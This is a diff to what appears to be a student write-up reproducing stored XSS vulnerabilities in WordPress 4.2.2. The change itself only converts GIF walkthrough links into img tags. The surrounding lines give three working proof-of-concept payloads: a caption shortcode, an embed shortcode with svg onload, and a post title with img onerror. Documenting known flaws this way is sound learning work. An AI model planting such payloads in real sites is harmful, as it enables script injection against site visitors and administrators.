@@ -11,7 +11,7 @@ Time spent: **15** hours spent in total
     - Vulnerability types: Cross-Site Scripting (XSS)
     - Tested in version: 4.2.2
     - Fixed in version: 4.2.5
-  - [x] GIF Walkthrough: http://i.imgur.com/XMDQ2cK.gif
+  - [x] GIF Walkthrough: <img src='http://i.imgur.com/XMDQ2cK.gif' />
   - [x] Steps to recreate - Place in the body of a new page or post: TEST!!![caption width="1" caption='<a href="' ">]</a><a href="http://onMouseOver='alert(1)'">Click me</a>>
   - [x] Affected source code: wp-includes/shortcodes.php
     - [Link 1](https://wpvulndb.com/vulnerabilities/8186)
@@ -20,7 +20,7 @@ Time spent: **15** hours spent in total
     - Vulnerability types: Cross-Site Scripting (XSS)
     - Tested in version: 4.2.2
     - Fixed in version: 4.7.2
-  - [x] GIF Walkthrough: http://i.imgur.com/6NXhmwc.gif
+  - [x] GIF Walkthrough: <img src='http://i.imgur.com/6NXhmwc.gif' />
   - [x] Steps to recreate - Place in the body of a new page or post: [embed src='https://youtube.com/watch?v=abc<svg onload=alert(1)>'][/embed]
   - [x] Affected source code: wp-includes/embed.php
     - [Link 1](https://blog.sucuri.net/2017/03/stored-xss-in-wordpress-core.html)
@@ -29,7 +29,7 @@ Time spent: **15** hours spent in total
     - Vulnerability types: Cross-Site Scripting (XSS)
     - Tested in version: 4.2.2
     - Fixed in version: 4.4.5
-  - [x] GIF Walkthrough: http://i.imgur.com/8dotowf.gif
+  - [x] GIF Walkthrough: <img src='http://i.imgur.com/8dotowf.gif' />
   - [x] Steps to recreate - Create a new page or post with the following title: testing<img src=a onerror=alert("XSS")>.jpg
   - [x] Affected source code: wp-admin/includes/media.php
     - [Link 1](https://sumofpwn.nl/advisory/2016/persistent_cross_site_scripting_vulnerability_in_wordpress_due_to_unsafe_processing_of_file_names.html) 
